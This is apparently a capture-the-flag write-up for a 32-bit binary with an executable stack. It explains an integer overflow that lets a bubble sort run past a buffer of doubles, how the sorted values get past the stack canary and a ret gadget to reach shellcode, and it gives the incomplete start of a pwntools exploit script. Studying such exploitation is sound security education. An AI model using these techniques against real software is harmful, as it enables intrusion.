**Binary Analysis:**

  - **Arch:** i386-32-little
  - **RELRO:** Partial RELRO
  - **Stack:** Canary found
  - **NX:** NX disabled (The stack is executable)
  - **PIE:** No PIE (Fixed base address)
  - **RWX:** Has RWX segments (Executable stack)

The binary first prints a stack address (a stack infoleak), then prompts the user for a number of inputs (`heapQt`), and finally reads and processes that many doubles. The main vulnerability is an integer overflow that allows us to control the size of a sorting loop, leading to a stack-based overflow.

#### 2\. Reversing

By decompiling the `game` function in Ghidra, we can understand the program's logic:


The bug lies within the `findArray` function:

```c
int __cdecl findArray(int *heapQt, int ptrArray, double a3, double a4)
{
  int v5; // [sp+1Ch] [bp-4h]@1

  _x86_get_pc_thunk_ax();
  v5 = *heapQt;
  while ( *heapQt < 2 * v5 )
  {
    if ( *(double *)(8 * (*heapQt - v5) + ptrArray) > (long double)a3
      && a4 > (long double)*(double *)(8 * (*heapQt - v5) + ptrArray) )
    {
      return *heapQt - v5;
    }
    *heapQt += (int)&GLOBAL_OFFSET_TABLE_ + 0xF7FB4001; // Integer overflow
  }
  *heapQt = v5;
  return 0;
}
```

The function will dereference a pointer to `heapQt` and modify its value. This integer overflow can be triggered by providing an input value between `-100.0` and `-10.0` to the program. The `heapQt` variable is then used in the `sortArray` function as the loop boundary. By manipulating `heapQt`, we can make the `sortArray` function sort doubles beyond the `ptrArray` buffer, reaching the stack canary and the return address.

The `sortArray` function is a standard bubble sort implementation:

```c
signed int __cdecl sortArray(_DWORD *heapQt, int ptrArray)
{
  double v2; // ST08_8@4
  int i; // [sp+0h] [bp-10h]@1
  int j; // [sp+4h] [bp-Ch]@2

  _x86_get_pc_thunk_ax();
  for ( i = 0; i < *heapQt; ++i )
  {
    for ( j = 0; j < *heapQt - 1; ++j )
    {
      if ( *(double *)(8 * j + ptrArray) > (long double)*(double *)(8 * (j + 1) + ptrArray) )
      {
        v2 = *(double *)(8 * j + ptrArray);
        *(double *)(8 * j + ptrArray) = *(double *)(ptrArray + 8 * (j + 1));
        *(double *)(8 * (j + 1) + ptrArray) = v2;
      }
    }
  }
  return 1;
}
```

This function will sort the first `heapQt` doubles in the `ptrArray` buffer from smallest to largest. This is the core of our exploit.

#### 3\. Exploitation

The strategy is to use the sorting logic to place our shellcode address on the stack, just after a `ret` gadget. This will bypass the stack canary and execute our shellcode.

1.  **HeapQt Overflow:** We must first send 64 inputs to fill the `ptrArray` buffer. One of these inputs must be a float between -100 and -10 (like `-23`), which triggers the `heapQt` overflow. The final value of `heapQt` needs to be large enough to sort over the canary and return address. We found that a value of 69 (0x45) works well.

2.  **Stack Layout:** The double values are 8 bytes each. The stack layout shows that the canary and return address are located 16 bytes after the `ptrArray` buffer.

    ```
    -0x210 ptrArray (64 doubles * 8 bytes)
    -0x00c canary (4 bytes)
    -0x004 ebp (4 bytes)
    +0x000 return address (4 bytes)
    ```

3.  **Crafting the Payload:**

      - The sorting algorithm moves values based on their floating-point representation. Smallest floats go to the lowest memory addresses.
      - We need to preserve the stack canary. We can achieve this by placing a double before the canary that is larger than the canary's value. The canary's first byte is random, so we must brute force it. We found that a float with a value of `0x0800000000000000` (large number) works in many cases.
      - We cannot place the shellcode address directly at the return address because its value (`0xff...`) would be sorted to the top. Instead, we use a ROP gadget.
      - The gadget we found is at `0x0804900a`, which is a simple `ret`. When interpreted as a double (`0x0804900a00000000`), it's small enough to be placed correctly by the sorting algorithm.
      - The next address on the stack will be executed after the `ret` gadget. We will place the address of our shellcode here. To do this, we create a double with the shellcode's address as its lower 4 bytes and a larger value in the upper 4 bytes (e.g., `0x8049010` and `scadr`) to ensure it's placed correctly.
      - Finally, the shellcode itself is split into double-sized chunks. Each chunk is padded with `NOP`s (`\x90`) to ensure they stay in the right order after sorting and execute correctly. The shellcode is also carefully crafted to start at a predictable location on the stack relative to the infoleak.

#### 4\. Exploit Code

```python
from pwn import *
import struct



# Get the infoleak, calculate the offset to our shellcode
stack = target.recvline()

stack = int(stack, 16)
scadr = stack + 0x1d8

# Create the integer we will create, that will be stored as the double after the ROPgadget 0x804900a, which is the first return address we put
ret_sc_double_upper = 0x8049010
ret_sc_double_lower = scadr
ret_sc_double = (ret_sc_double_upper << 32) | ret_sc_double_lower
ret_sc_double_float = struct.unpack("d", p64(ret_sc_double))

target.recvuntil("How long: ")
```
